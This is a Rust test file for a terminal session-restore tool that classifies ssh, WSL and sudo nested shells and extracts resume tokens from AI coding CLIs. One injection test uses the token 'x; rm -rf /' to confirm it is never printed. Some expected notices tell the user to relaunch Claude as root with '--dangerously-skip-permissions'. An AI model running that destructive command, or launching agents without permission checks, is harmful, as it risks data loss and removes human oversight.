        let cli = nested_cli("claude", None);
        let step = nested_resume_step(&ch, Some(&cli)).unwrap();
        assert_eq!(
            nested_restore_notice(&ch, Some(&cli), true, Some(&step)),
            "── re-establishing this terminal's nested shell (sudo su) and re-launching claude automatically — if it stops: cd '/srv/app' && IS_SANDBOX=1 claude --dangerously-skip-permissions ──"
        );
        assert_eq!(
            nested_resume_abort_hint("claude", &step),
            "── claude was not re-launched — run it: cd '/srv/app' && IS_SANDBOX=1 claude --dangerously-skip-permissions ──"
        );
        // auto = false keeps the honest manual wording: with no session
        // token there is nothing to hand the user but variant C.
        assert_eq!(
            nested_restore_notice(&ch, Some(&cli), false, Some(&step)),
            "── this terminal had a nested shell (sudo su); anything running inside it was not restored — re-establish it manually ──"
        );
    }

    /// Nested-cli-resume regression (hypothesis c): re-witnessing the SAME
    /// WSL typed-opener classification, pinned shape by shape.
    ///
    /// The user reports WSL terminals being "a little iffy" with no repro.
    /// This is the sharpest edge I can name: only the two BARE shapes are
    /// recognised as a nested shell, and `wsl_interactive_shell` is
    /// deliberately kept in lockstep with `wsl_family` so a typed `wsl` and a
    /// `wsl` TERMINAL can never disagree. Everything else — including the
    /// perfectly ordinary `wsl -u root` and `wsl --cd <dir>` — falls through.
    ///
    /// Falling through is NOT silent: the typed opener reads as an ordinary
    /// long-running command, so there is no breadcrumb, no hook injection
    /// into the distro, and the Win32 cwd tracker keeps stamping the local
    /// Windows path over the POSIX one the user is actually in (the field
    /// shape `track_hook_exec` quotes: "the composer still shows the LOCAL
    /// cwd").
    ///
    /// This test does not assert that the gap is RIGHT — it asserts what the
    /// gap IS, so that closing it is a deliberate act that must change both
    /// classifiers together, and so the next person does not have to
    /// rediscover the list.
    #[test]
    fn wsl_typed_opener_classification_table() {
        // Recognised: the bare shapes, exactly the two `wsl_family` hooks.
        for ok in ["wsl", "wsl.exe", "wsl -d Ubuntu", "wsl --distribution Ubuntu"] {
            assert!(nested_shell_cmd(ok), "{ok} must classify");
            assert!(crosses_to_posix(ok), "{ok} must cross to POSIX");
        }
        // A distro name with spaces now survives, since the tokeniser is
        // quote-aware (it did not before `split_ws_quoted`).
        assert!(nested_shell_cmd(r#"wsl -d "My Distro""#));

        // Correctly refused: these run a finite command, not a shell.
        for finite in [
            "wsl -e bash -lc ls",
            "wsl --exec ls",
            "wsl -- ls",
            "wsl ls",
            "wsl --status",
            "wsl -l -v",
            "wsl --shutdown",
            "wsl --terminate Ubuntu",
        ] {
            assert!(!nested_shell_cmd(finite), "{finite} is not an interactive shell");
        }

        // THE FIX (field report "WSL is still a little iffy"): ordinary
        // interactive shapes that used to fall through, because the old rule
        // was `matches!(args, [] | ["-d"|"--distribution", _])` and refused
        // everything else. They are now gated with the same discipline ssh's
        // `-i`/`-p` and the `env` prefix already use: known flags consumed
        // with their values.
        for ok in [
            "wsl -u root",
            "wsl --user root",
            "wsl --cd /tmp",
            "wsl --cd ~",
            "wsl -d Ubuntu -u root",
            "wsl -u root -d Ubuntu",
            "wsl --distribution Ubuntu --user root --cd /srv",
            "wsl --shell-type login",
            "wsl --shell-type standard -d Ubuntu",
            r#"wsl --cd "C:\my project""#,
        ] {
            assert!(nested_shell_cmd(ok), "{ok} must now classify");
            assert!(crosses_to_posix(ok), "{ok} must cross to POSIX");
        }

        // Still refused, deliberately:
        for no in [
            // Asks for no shell at all.
            "wsl --shell-type none",
            // Microsoft's internal system distro — not the user's shell, and
            // it may not even have bash.
            "wsl --system",
            // A flag-value miss is never a guess.
            "wsl -u",
            "wsl -d",
            "wsl --cd",
            // Unrecognised flags keep the exotic-argv doctrine.
            "wsl --no-such-flag",
            "wsl -x",
            // A command operand after the flags is a finite session.
            "wsl -u root ls",
            "wsl --cd /tmp -- ls",
            "wsl -d Ubuntu -e bash -lc ls",
        ] {
            assert!(!nested_shell_cmd(no), "{no} must stay refused");
        }
    }

    /// The typed classifier and the TERMINAL classifier must stay in step for
    /// every shape a terminal can actually be spawned with — the invariant
    /// `wsl_interactive_shell` was written to hold. The typed lane is a
    /// deliberate superset (`--cd`/`--shell-type` cannot ride a spawn because
    /// `synth_wsl_args` emits its own); this pins both halves so the
    /// divergence can only ever be the documented one.
    #[test]
    fn wsl_typed_and_terminal_classifiers_agree() {
        use crate::state::{shell_family, ShellFamily, TermKind};
        let fam = |args: &[&str]| {
            let owned: Vec<String> = args.iter().map(|s| s.to_string()).collect();
            shell_family(&TermKind::Shell, "wsl.exe", &owned)
        };
        // Hooked at terminal level AND typed level.
        for (args, distro) in [
            (vec![], None),
            (vec!["-d", "Ubuntu"], Some("Ubuntu")),
            (vec!["--distribution", "Ubuntu"], Some("Ubuntu")),
            (vec!["-u", "root"], None),
            (vec!["--user", "root"], None),
            (vec!["-d", "Ubuntu", "-u", "root"], Some("Ubuntu")),
            (vec!["-u", "root", "-d", "Ubuntu"], Some("Ubuntu")),
        ] {
            assert_eq!(
                fam(&args),
                ShellFamily::WslShell {
                    distro: distro.map(str::to_string)
                },
                "terminal-level: wsl {args:?}"
            );
            assert!(
                crate::state::wsl_interactive_shell(&args),
                "typed-level: wsl {args:?}"
            );
        }
        // The documented divergence: typed yes, terminal no, because the
        // synthesized tail already carries its own --cd/--exec.
        for args in [vec!["--cd", "/tmp"], vec!["--shell-type", "login"]] {
            assert!(crate::state::wsl_interactive_shell(&args));
            assert_eq!(fam(&args), ShellFamily::Other, "spawn would duplicate the flag");
        }
        // Refused by both.
        for args in [
            vec!["--system"],
            vec!["-e", "bash"],
            vec!["--"],
            vec!["ls"],
            vec!["-u"],
        ] {
            assert!(!crate::state::wsl_interactive_shell(&args), "typed: {args:?}");
            assert_eq!(fam(&args), ShellFamily::Other, "terminal: {args:?}");
        }
    }

    /// FIELD BUG (second user): his opener is
    /// `ssh -i "C:\…\hosting.pem" ubuntu@52.201.138.138`. Tokenised with
    /// `split_whitespace` the quoted key path shattered, `-i` ate `"C:\…`,
    /// the next word read as the destination, and the whole opener failed to
    /// classify — so no breadcrumb, no hook injection, no recovery, for an
    /// entirely ordinary ssh command. Every flag value containing a space hit
    /// this.
    #[test]
    fn quoted_flag_values_do_not_break_nested_classification() {
        for opener in [
            r#"ssh -i "C:\Users\dad\keys\hosting.pem" ubuntu@52.201.138.138"#,
            r#"ssh -i "C:\my keys\hosting.pem" ubuntu@52.201.138.138"#,
            r#"ssh -F "C:\ssh config\config" -p 8022 root@192.168.1.110"#,
            r#"ssh -o "ProxyCommand=connect -H h:1 %h %p" user@host"#,
        ] {
            assert!(
                nested_shell_cmd(opener),
                "must classify as an interactive nested shell: {opener}"
            );
            assert!(
                crosses_to_posix(opener),
                "and as crossing into a POSIX world: {opener}"
            );
        }
        // The unquoted forms keep working exactly as before.
        assert!(nested_shell_cmd("ssh ubuntu@52.201.138.138"));
        assert!(nested_shell_cmd("ssh -p 8022 root@192.168.1.110"));
        assert!(nested_shell_cmd(r"ssh -i C:\keys\k.pem user@host"));
    }

    /// The tokeniser must not break the things it was kept simple for:
    /// backslashes are never interpreted, so Windows path stems still read.
    #[test]
    fn quoted_tokeniser_leaves_windows_paths_alone() {
        assert_eq!(
            split_ws_quoted(r"C:\Windows\System32\OpenSSH\ssh.exe host"),
            vec![r"C:\Windows\System32\OpenSSH\ssh.exe", "host"]
        );
        // A quoted program path now reads as ONE token, so its stem resolves.
        assert_eq!(
            split_ws_quoted(r#""C:\Program Files\Git\bin\bash.exe" -l"#),
            vec![r"C:\Program Files\Git\bin\bash.exe", "-l"]
        );
        assert!(nested_shell_cmd(r#""C:\Program Files\OpenSSH\ssh.exe" user@host"#));
        // Plain lines are unchanged.
        assert_eq!(split_ws_quoted("sudo su"), vec!["sudo", "su"]);
        assert_eq!(split_ws_quoted("  wsl   -d  Ubuntu "), vec!["wsl", "-d", "Ubuntu"]);
        assert_eq!(split_ws_quoted(""), Vec::<String>::new());
        // An empty quoted argument is a real argument.
        assert_eq!(split_ws_quoted(r#"ssh -o "" host"#), vec!["ssh", "-o", "", "host"]);
        // An unbalanced quote degrades to "the rest is one token" rather than
        // dropping anything.
        assert_eq!(split_ws_quoted(r#"ssh "unclosed host"#), vec!["ssh", "unclosed host"]);
    }

    /// The documented `split_whitespace` caveat on `nested_shell_argv` — a
    /// quoted env-assignment value defeating the prefix strip — is gone as a
    /// consequence, and both classifiers agree about it.
    #[test]
    fn quoted_env_prefix_values_now_strip() {
        assert!(nested_shell_cmd(r#"FOO="a b" sudo su"#));
        assert!(nested_shell_cmd(r#"FOO="a b" ssh user@host"#));
        assert!(crosses_to_posix(r#"FOO="a b" ssh user@host"#));
        assert_eq!(
            nested_end_verdict(Some(r#"FOO="a b" ssh user@host"#), Some(255), false),
            NestedEnd::Died
        );
    }

    /// A finite remote command must STILL be refused — the looser tokeniser
    /// must not turn `ssh host ls` into a nested shell.
    #[test]
    fn quoted_tokeniser_keeps_finite_commands_out() {
        assert!(!nested_shell_cmd("ssh user@host ls"));
        assert!(!nested_shell_cmd(r#"ssh -i "C:\my keys\k.pem" user@host ls -la"#));
        assert!(!nested_shell_cmd(r#"ssh -i "C:\my keys\k.pem" user@host "uptime""#));
        // A flag-value miss at the end is still a refusal, never a guess.
        assert!(!nested_shell_cmd(r#"ssh -i "C:\my keys\k.pem""#));
    }

    /// nested-death reinstate: the DIED-vs-DELIBERATE verdict. The whole
    /// recovery hangs on this being conservative — a false "died" resurrects
    /// a session the user closed on purpose, which is the one thing the
    /// feature must never do.
    #[test]
    fn nested_end_verdict_only_resurrects_a_failed_ssh() {
        use NestedEnd::*;
        // ssh's documented convention: 255 means ssh itself failed — a
        // dropped link, a timed-out TCP session after a laptop sleep.
        assert_eq!(nested_end_verdict(Some("ssh user@host"), Some(255), false), Died);
        assert_eq!(
            nested_end_verdict(Some("ssh -p 8022 root@192.168.1.110"), Some(255), false),
            Died
        );
        // The field opener with a quoted key path containing spaces.
        assert_eq!(
            nested_end_verdict(
                Some(r#"ssh -i "C:\keys\my host\hosting.pem" ubuntu@52.201.138.138"#),
                Some(255),
                false
            ),
            Died
        );

        // A clean logout is the user's doing — never resurrect it.
        assert_eq!(nested_end_verdict(Some("ssh user@host"), Some(0), false), Deliberate);
        // So is any other status: that one belongs to the REMOTE command
        // (`exit 3` in the remote shell returns 3), not to the transport.
        for code in [1, 2, 3, 126, 127, 130] {
            assert_eq!(
                nested_end_verdict(Some("ssh user@host"), Some(code), false),
                Deliberate,
                "exit {code} is the remote side's, not a transport failure"
            );
        }

        // No status at all (cmd.exe: `%ERRORLEVEL%` cannot be expanded by a
        // PROMPT macro, D7) is UNKNOWN — and unknown never auto-replays.
        assert_eq!(nested_end_verdict(Some("ssh user@host"), None, false), Unknown);

        // Non-ssh crossings are never a transport failure: a distro or a
        // container going away is not "my connection dropped".
        assert_eq!(nested_end_verdict(Some("wsl -d Ubuntu"), Some(255), false), Deliberate);
        assert_eq!(nested_end_verdict(Some("wsl"), Some(1), false), Deliberate);
        assert_eq!(
            nested_end_verdict(Some("docker exec -it c bash"), Some(255), false),
            Deliberate
        );
        assert_eq!(nested_end_verdict(Some("sudo su"), Some(255), false), Deliberate);

        // Nothing recorded ⇒ nothing to judge.
        assert_eq!(nested_end_verdict(None, Some(255), false), Unknown);
        assert_eq!(nested_end_verdict(Some("   "), Some(255), false), Unknown);
    }

    /// A ladder already climbing must survive the SECOND identical failure.
    ///
    /// Found by probe `nested_death_reinstate` against a real ssh: the first
    /// drop reports 255, the replay fails the same way, and PowerShell's hook
    /// reports **1** — because `bootstrap.rs`'s prompt wrapper only trusts
    /// `$LASTEXITCODE` when the pipeline CHANGED it, and an identical repeat
    /// reads as unchanged and folds to `$?`. With a strict 255 rule the
    /// ladder stopped after one attempt against a host that was still down,
    /// which is the exact case it exists for.
    #[test]
    fn a_live_ladder_survives_the_repeat_exit_code_collapse() {
        use NestedEnd::*;
        let ssh = Some("ssh user@host");
        // Rung 1 is strict: only ssh's own 255 may START a ladder.
        assert_eq!(nested_end_verdict(ssh, Some(255), false), Died);
        assert_eq!(nested_end_verdict(ssh, Some(1), false), Deliberate);
        // Once climbing, the folded repeat continues it.
        assert_eq!(nested_end_verdict(ssh, Some(1), true), Died);
        assert_eq!(nested_end_verdict(ssh, Some(255), true), Died);
        assert_eq!(nested_end_verdict(ssh, Some(3), true), Died);
        // But a CLEAN logout ends it, ladder or no ladder: the user got back
        // in and left on purpose.
        assert_eq!(nested_end_verdict(ssh, Some(0), true), Deliberate);
        // And the loosening never reaches a non-ssh opener or a family with
        // no exit status at all.
        assert_eq!(nested_end_verdict(Some("wsl -d Ubuntu"), Some(1), true), Deliberate);
        assert_eq!(nested_end_verdict(ssh, None, true), Unknown);
    }

    /// The env-prefix form the v0.1.18 CLI work introduced must reach the
    /// same verdict as the bare opener — `nested_shell_cmd`/`crosses_to_posix`
    /// both strip it, and a classifier that disagreed with them would replay
    /// chains the injection never armed for (or refuse ones it did).
    #[test]
    fn nested_end_verdict_sees_through_an_env_prefix() {
        assert_eq!(
            nested_end_verdict(Some("FOO=1 ssh user@host"), Some(255), false),
            NestedEnd::Died
        );
        assert_eq!(
            nested_end_verdict(Some("FOO=1 BAR=2 ssh user@host"), Some(0), false),
            NestedEnd::Deliberate
        );
        // Exactly the openers the injection classifies, and no others.
        for opener in ["ssh host", "FOO=1 ssh host"] {
            assert!(
                nested_shell_cmd(opener) && crosses_to_posix(opener),
                "{opener} must classify as a crossing nested shell"
            );
        }
    }

    /// A `.exe` stem and an absolute path must not change the verdict —
    /// `cmd_stem` is what both classifiers use, so this keeps them aligned.
    #[test]
    fn nested_end_verdict_normalises_the_ssh_stem() {
        assert_eq!(nested_end_verdict(Some("ssh.exe host"), Some(255), false), NestedEnd::Died);
        assert_eq!(
            nested_end_verdict(Some(r"C:\Windows\System32\OpenSSH\ssh.exe host"), Some(255), false),
            NestedEnd::Died
        );
    }

    /// opener preserves the recorded chain — deeper hops AND the
    /// beacon-witnessed cli_cwd survive a re-establish cycle; a different
    /// opener still replaces (newest witnessed chain wins); no prior chain
    /// mints a fresh one.
    #[test]
    fn reopen_nested_chain_preserves_breadcrumb() {
        let p = std::path::Path::new("/home/tester");
        // Fresh open.
        let fresh = reopen_nested_chain(None, "sudo su", p, 10);
        assert_eq!(fresh.cmds, s(&["sudo su"]));
        assert_eq!(fresh.cli_cwd, None);
        assert_eq!(fresh.opened_ms, 10);
        // Same opener (the auto-typed step 1): hops + cli_cwd preserved,
        // entered_cwd/opened_ms refreshed.
        let prior = crate::state::NestedChain {
            cmds: s(&["sudo su", "su - deploy"]),
            entered_cwd: PathBuf::from("/old"),
            cli_cwd: Some(PathBuf::from("/srv/app")),
            opened_ms: 1,
            launch_cmd: None,
        };
        let kept = reopen_nested_chain(Some(prior.clone()), "  sudo su ", p, 20);
        assert_eq!(kept.cmds, s(&["sudo su", "su - deploy"]), "hops must survive");
        assert_eq!(kept.cli_cwd, Some(PathBuf::from("/srv/app")), "cli_cwd must survive");
        assert_eq!(kept.entered_cwd, p);
        assert_eq!(kept.opened_ms, 20);
        // A different opener replaces — the user built a NEW chain.
        let replaced = reopen_nested_chain(Some(prior), "su - other", p, 30);
        assert_eq!(replaced.cmds, s(&["su - other"]));
        assert_eq!(replaced.cli_cwd, None);
    }

    /// F1 spec §4.3 goldens — byte-exact variants A/B/C, the escaping choke
    /// points, and the truncation degradations.
    #[test]
    fn nested_restore_notice_golden() {
        // Variant A — the user's exact scenario from the investigation.
        let cli = nested_cli("claude", Some("xyz"));
        assert_eq!(
            nested_restore_notice_f(&chain(&["sudo su"], Some("/")), Some(&cli)),
            "── this terminal had a nested shell (sudo su); its claude session was not auto-resumed — re-establish: sudo su; cd '/'; claude --resume xyz ──"
        );
        // A with a quote-bearing witnessed cwd: sh_single_quote escaping.
        assert_eq!(
            nested_restore_notice_f(&chain(&["sudo su"], Some("/a'b")), Some(&cli)),
            "── this terminal had a nested shell (sudo su); its claude session was not auto-resumed — re-establish: sudo su; cd '/a'\\''b'; claude --resume xyz ──"
        );
        // Variant B — identity but no beacon-witnessed cwd.
        assert_eq!(
            nested_restore_notice_f(&chain(&["sudo su"], None), Some(&cli)),
            "── this terminal had a nested shell (sudo su); its claude session was not auto-resumed — re-establish: sudo su; claude --resume xyz (run it from the conversation's directory) ──"
        );
        // B via cd-truncation: a >120-char quoted path drops the cd.
        let long = format!("/{}", "x".repeat(130));
        let n = nested_restore_notice_f(&chain(&["sudo su"], Some(&long)), Some(&cli));
        assert!(n.ends_with("claude --resume xyz (run it from the conversation's directory) ──"));
        assert!(!n.contains("cd '"), "over-long witnessed cwd must drop the cd: {n}");
        // Variant C — no identity at all.
        assert_eq!(
            nested_restore_notice_f(&chain(&["sudo su"], None), None),
            "── this terminal had a nested shell (sudo su); anything running inside it was not restored — re-establish it manually ──"
        );
        // C — identity without a token.
        assert_eq!(
            nested_restore_notice_f(&chain(&["sudo su"], Some("/")), Some(&nested_cli("claude", None))),
            "── this terminal had a nested shell (sudo su); anything running inside it was not restored — re-establish it manually ──"
        );
        // C — an UNSAFE token never prints (r3-S1 choke point).
        let evil = nested_cli("claude", Some("x; rm -rf /"));
        let n = nested_restore_notice_f(&chain(&["sudo su"], Some("/")), Some(&evil));
        assert!(
            n.contains("re-establish it manually") && !n.contains("rm -rf"),
            "unsafe token must degrade to variant C: {n}"
        );
        // Multi-hop chain joins in order; control bytes are stripped.
        assert_eq!(
            nested_restore_notice_f(&chain(&["sudo su", "su - \x1b[31mdeploy"], None), None),
            "── this terminal had a nested shell (sudo su; su - [31mdeploy); anything running inside it was not restored — re-establish it manually ──"
        );
        // Empty chain reads "nested shell"; 100-char chain truncation is
        // char-safe and marked.
        assert_eq!(
            nested_restore_notice_f(&chain(&[], None), None),
            "── this terminal had a nested shell (nested shell); anything running inside it was not restored — re-establish it manually ──"
        );
        let huge = "sudo su -- very long command ".repeat(10);
        let n = nested_restore_notice_f(&chain(&[&huge], None), None);
        assert!(n.contains('…'), "over-long chain must truncate: {n}");
        assert!(n.chars().count() < 250);
    }

    /// F1 spec I1 regression table: only a confident NON-nested identity may
    /// ever feed auto-resume composition — `nested: true` loses regardless
    /// of confidence.
    #[test]
    fn nested_inner_cli_never_resumes() {
        for conf in [
            CliConfidence::Explicit,
            CliConfidence::Correlated,
            CliConfidence::Ambiguous,
        ] {
            for nested in [false, true] {
                let cli = InnerCli {
                    adapter: "claude".into(),
                    resume_token: Some(Uuid::new_v4().to_string()),
                    confidence: conf,
                    cwd: PathBuf::from("/"),
                    nested,
                    token_self_reported: false,
                };
                let want = !nested && !matches!(conf, CliConfidence::Ambiguous);
                assert_eq!(
                    cli_wants_resume(&cli),
                    want,
                    "confidence {conf:?} nested {nested}"
                );
            }
        }
    }

    /// F1 spec §2.4: chain append cap + consecutive dedupe.
    #[test]
    fn nested_chain_cap_and_dedupe() {
        let mut cmds = s(&["sudo su"]);
        assert!(!append_nested_cmd(&mut cmds, "sudo su"), "consecutive dupe");
        assert!(!append_nested_cmd(&mut cmds, "  sudo su  "), "trimmed dupe");
        assert!(append_nested_cmd(&mut cmds, "su - deploy"));
        assert!(append_nested_cmd(&mut cmds, "sudo su"), "non-consecutive repeat is a real hop");
        assert!(!append_nested_cmd(&mut cmds, ""), "empty never records");
        for i in cmds.len()..NESTED_CHAIN_MAX {
            assert!(append_nested_cmd(&mut cmds, &format!("bash -l # {i}")));
        }
        assert_eq!(cmds.len(), NESTED_CHAIN_MAX);
        assert!(!append_nested_cmd(&mut cmds, "zsh"), "cap holds");
        assert_eq!(cmds.len(), NESTED_CHAIN_MAX);
    }

    /// Bug 1 (claude wake): the session-id re-pin evidence rules. Uses real
    /// files in a temp dir — created()/modified() are the exact witnesses
    /// the production path reads.
    #[test]
    fn claude_repin_evidence_rules() {
        use std::time::{Duration, SystemTime};
        let ms = |t: SystemTime| {
            t.duration_since(SystemTime::UNIX_EPOCH).unwrap().as_millis() as u64
        };
        let dir = std::env::temp_dir().join(format!("tc_repin_{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        let pinned = Uuid::new_v4();
        let rotated = Uuid::new_v4();
        let now = SystemTime::now();
        let window = (ms(now) - 60_000, ms(now) + 60_000);

        // No files at all: abstain.
        assert_eq!(
            claude_repin_candidate_in(&dir, pinned, window.0, window.1),
            None
        );

        // One rotated jsonl born inside the window, pinned ABSENT: re-pin.
        std::fs::write(dir.join(format!("{rotated}.jsonl")), b"x").unwrap();
        assert_eq!(
            claude_repin_candidate_in(&dir, pinned, window.0, window.1),
            Some(rotated)
        );

        // Pinned present and FRESH (written during the run): keep the pin.
        std::fs::write(dir.join(format!("{pinned}.jsonl")), b"x").unwrap();
        assert_eq!(
            claude_repin_candidate_in(&dir, pinned, window.0, window.1),
            None
        );

        // Pinned present but STALE (fork-on-resume: the old transcript froze
        // before this run) + exactly one in-window birth: re-pin.
        let f = std::fs::OpenOptions::new()
            .write(true)
            .open(dir.join(format!("{pinned}.jsonl")))
            .unwrap();
        f.set_modified(now - Duration::from_secs(3600)).unwrap();
        drop(f);
        assert_eq!(
            claude_repin_candidate_in(&dir, pinned, window.0, window.1),
            Some(rotated)
        );

        // A second in-window candidate: ambiguous, abstain (never guess).
        std::fs::write(dir.join(format!("{}.jsonl", Uuid::new_v4())), b"x").unwrap();
        assert_eq!(
            claude_repin_candidate_in(&dir, pinned, window.0, window.1),
            None
        );

        // A window that excludes every birth: abstain even with one file.
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn extracts_explicit_ids() {
        let u = Uuid::new_v4();
        assert_eq!(parse_claude_session(&s(&["claude", "--resume", &u.to_string()])), Some(u));
        assert_eq!(parse_claude_session(&s(&["claude", "--session-id", &u.to_string()])), Some(u));
        assert_eq!(parse_claude_session(&s(&["claude", &format!("--resume={u}")])), Some(u));
    }

    #[test]
    fn rejects_non_ids() {
        assert_eq!(parse_claude_session(&s(&["claude"])), None);
        assert_eq!(parse_claude_session(&s(&["claude", "--resume", "garbage"])), None);
    }

    #[test]
    fn explicit_argv_wins() {
        let u = Uuid::new_v4();
        let (tok, conf) = claude_extract(&s(&["claude", "--resume", &u.to_string()]), Path::new("C:\\x"), None);
        assert_eq!(tok, Some(u.to_string()));
        assert_eq!(conf, CliConfidence::Explicit);
    }

    #[test]
    fn codex_explicit_forms() {
        let u = Uuid::new_v4().to_string();
        let p = Path::new("C:\\x");
        assert_eq!(
            codex_extract(&s(&["codex", "resume", &u]), p, None),
            (Some(u.clone()), CliConfidence::Explicit)
        );
        assert_eq!(
            codex_extract(&s(&["codex", "exec", "resume", &u]), p, None),
            (Some(u.clone()), CliConfidence::Explicit)
        );
        let rollout = format!("experimental_resume=C:\\u\\.codex\\sessions\\2026\\07\\01\\rollout-2026-07-01T10-00-00-{u}.jsonl");
        assert_eq!(
            codex_extract(&s(&["codex", "-c", &rollout]), p, None),
            (Some(u.clone()), CliConfidence::Explicit)
        );
        // `resume --last` must NOT be captured as an id.
        let (tok, _) = codex_extract(&s(&["codex", "resume", "--last"]), p, None);
        assert_eq!(tok, None);
    }

    #[test]
    fn amp_thread_forms() {
        let p = Path::new("C:\\x");
        assert_eq!(
            amp_extract(&s(&["amp", "threads", "continue", "T-abc123"]), p, None),
            (Some("T-abc123".into()), CliConfidence::Explicit)
        );
        assert_eq!(
            amp_extract(&s(&["amp", "threads", "fork", "T-zz"]), p, None),
            (Some("T-zz".into()), CliConfidence::Explicit)
        );
        // A non-T token after `threads continue` is not an identity.
        let (tok, _) = amp_extract(&s(&["amp", "threads", "continue", "nope"]), p, None);
        assert_eq!(tok, None);
    }

    #[test]
    fn crush_flag_trap() {
        let p = Path::new("C:\\x");
        assert_eq!(
            crush_extract(&s(&["crush", "-s", "sess1"]), p, None),
            (Some("sess1".into()), CliConfidence::Explicit)
        );
        // -C (continue-last) and -c (cwd) carry no session identity.
        let (tok, conf) = crush_extract(&s(&["crush", "-C"]), p, None);
        assert_eq!((tok, conf), (None, CliConfidence::Ambiguous));
        let (tok, _) = crush_extract(&s(&["crush", "-c", "C:\\proj"]), p, None);
        assert_eq!(tok, None);
    }

    #[test]
    fn cursor_equals_form() {
        let p = Path::new("C:\\x");
        assert_eq!(
            cursor_extract(&s(&["cursor-agent", "--resume=chat42"]), p, None),
            (Some("chat42".into()), CliConfidence::Explicit)
        );
        assert_eq!(
            cursor_extract(&s(&["cursor-agent", "--resume", "chat42"]), p, None),
            (Some("chat42".into()), CliConfidence::Explicit)
        );
    }

    #[test]
    fn explicit_only_adapters() {
        let p = Path::new("C:\\x");
        assert_eq!(
            copilot_extract(&s(&["copilot", "-r", "sid"]), p, None).0,
            Some("sid".into())
        );
        assert_eq!(
            qwen_extract(&s(&["qwen", "--session-id", "q1"]), p, None).0,
            Some("q1".into())
        );
        assert_eq!(
            goose_extract(&s(&["goose", "session", "--session-id", "20260702_1"]), p, None).0,
            Some("20260702_1".into())
        );
        assert_eq!(
            opencode_extract(&s(&["opencode", "--session", "oc1"]), p, None).0,
            Some("oc1".into())
        );
        assert_eq!(
            cline_extract(&s(&["cline", "--id", "c1"]), p, None).0,
            Some("c1".into())
        );
        assert_eq!(
            devin_extract(&s(&["devin", "-r", "brisk-otter"]), p, None).0,
            Some("brisk-otter".into())
        );
        // Missing value must not swallow the next flag.
        assert_eq!(cline_extract(&s(&["cline", "--id", "--verbose"]), p, None).0, None);
    }

    #[test]
    fn matcher_runtime_argv() {
        let m = Match::RuntimeArgv { runtimes: NODE_RT, needle: "gemini" };
        assert!(m.matches("node", &s(&["node", "C:\\nvm\\v22\\node_modules\\@google\\gemini-cli\\dist\\index.js"])));
        assert!(m.matches("node", &s(&["node", "C:\\Users\\z\\AppData\\Roaming\\npm\\node_modules\\.bin\\gemini"])));
        assert!(!m.matches("node", &s(&["node", "server.js"])));
        assert!(!m.matches("gemini", &s(&["gemini"]))); // stem not in runtimes for RuntimeArgv
        let e = Match::Either { stems: &["amp"], runtimes: NODE_RT, needle: "amp" };
        assert!(e.matches("amp", &s(&["amp", "threads", "continue", "T-1"])));
        // "examples/…" must not fuzzy-match "amp".
        assert!(!e.matches("node", &s(&["node", "examples\\demo.js"])));
    }

    /// U6: hook-based cmdline analysis — explicit ids, subcommand forms,
    /// quoted paths, bare launches degrade to Ambiguous, non-adapters None.
    #[test]
    fn analyze_cmdline_forms() {
        let cwd = Path::new("/home/z/proj");
        let u = Uuid::new_v4().to_string();

        let cli = analyze_cmdline(&format!("claude --resume {u}"), cwd).unwrap();
        assert_eq!(cli.adapter, "claude");
        assert_eq!(cli.resume_token.as_deref(), Some(u.as_str()));
        assert_eq!(cli.confidence, CliConfidence::Explicit);
        assert_eq!(cli.cwd, cwd);

        let cli = analyze_cmdline(&format!("claude --resume={u}"), cwd).unwrap();
        assert_eq!(cli.confidence, CliConfidence::Explicit);

        let cli = analyze_cmdline(&format!("codex resume {u}"), cwd).unwrap();
        assert_eq!(cli.adapter, "codex");
        assert_eq!(cli.resume_token.as_deref(), Some(u.as_str()));
        assert_eq!(cli.confidence, CliConfidence::Explicit);

        // Quoted path to the binary still resolves the stem.
        let cli = analyze_cmdline(&format!("'/usr/local/bin/claude' --resume {u}"), cwd).unwrap();
        assert_eq!(cli.adapter, "claude");
        assert_eq!(cli.confidence, CliConfidence::Explicit);

        // Bare launch: a candidate with Ambiguous confidence (no local
        // filesystem to correlate against until §7.3), never a guess.
        let cli = analyze_cmdline("claude", cwd).unwrap();
        assert_eq!(cli.adapter, "claude");
        assert_eq!(cli.resume_token, None);
        assert_eq!(cli.confidence, CliConfidence::Ambiguous);

        // Non-adapters and empty lines yield nothing.
        assert!(analyze_cmdline("git status", cwd).is_none());
        assert!(analyze_cmdline("echo claude", cwd).is_none());
        assert!(analyze_cmdline("", cwd).is_none());
        assert!(analyze_cmdline("   ", cwd).is_none());
        // Disabled adapters stay off through this path too.
        assert!(analyze_cmdline("aider", cwd).is_none());
    }

    /// env-prefix-cli — the classification matrix for a leading POSIX
    /// environment prefix. Row 1 is the field line verbatim: `IS_SANDBOX=1
    /// claude --dangerously-skip-permissions`, typed inside a hooked nested
    /// `sudo su` over ssh, which used to stem argv[0] = `IS_SANDBOX=1` into
    /// no adapter at all — so the CLI went unattributed and both the
    /// v0.1.17 strip collapse and the v0.1.15/16 keyboard ownership (which
    /// key off attribution) regressed to plain-shell behaviour.
    #[test]
    fn env_prefix_cli_matrix() {
        let cwd = Path::new("/home/z/proj");
        let u = Uuid::new_v4().to_string();
        // (command line, expected adapter, expected resume token)
        let cases: Vec<(String, Option<&str>, Option<String>)> = vec![
            // THE FIELD LINE: attributed, token-less, never a guess.
            (
                "IS_SANDBOX=1 claude --dangerously-skip-permissions".into(),
                Some("claude"),
                None,
            ),
            // Several assignments in a row.
            ("A=1 B=2 C=3 claude".into(), Some("claude"), None),
            // Values with shell-ish payloads that are NOT tokenisation.
            ("PATH=/x/y:/z claude".into(), Some("claude"), None),
            ("EMPTY= claude".into(), Some("claude"), None),
            // Quoted values: `split_cmdline` un-quotes them into ONE token,
            // so `FOO=a b` is recognised exactly like `FOO=1`.
            (
                format!("FOO=\"a b\" claude --resume {u}"),
                Some("claude"),
                Some(u.clone()),
            ),
            (format!("FOO='a b' claude --resume {u}"), Some("claude"), Some(u.clone())),
            // THE BREADCRUMB: a resume token still extracts THROUGH the
            // prefix — the whole point of attributing this line at all.
            (
                format!("IS_SANDBOX=1 claude --resume {u}"),
                Some("claude"),
                Some(u.clone()),
            ),
            (format!("A=1 B=2 codex resume {u}"), Some("codex"), Some(u.clone())),
            // Assignments with NO command are a launch of nothing.
            ("FOO=bar".into(), None, None),
            ("A=1 B=2".into(), None, None),
            // The `env` wrapper, conservatively gated.
            (format!("env FOO=1 claude --resume {u}"), Some("claude"), Some(u.clone())),
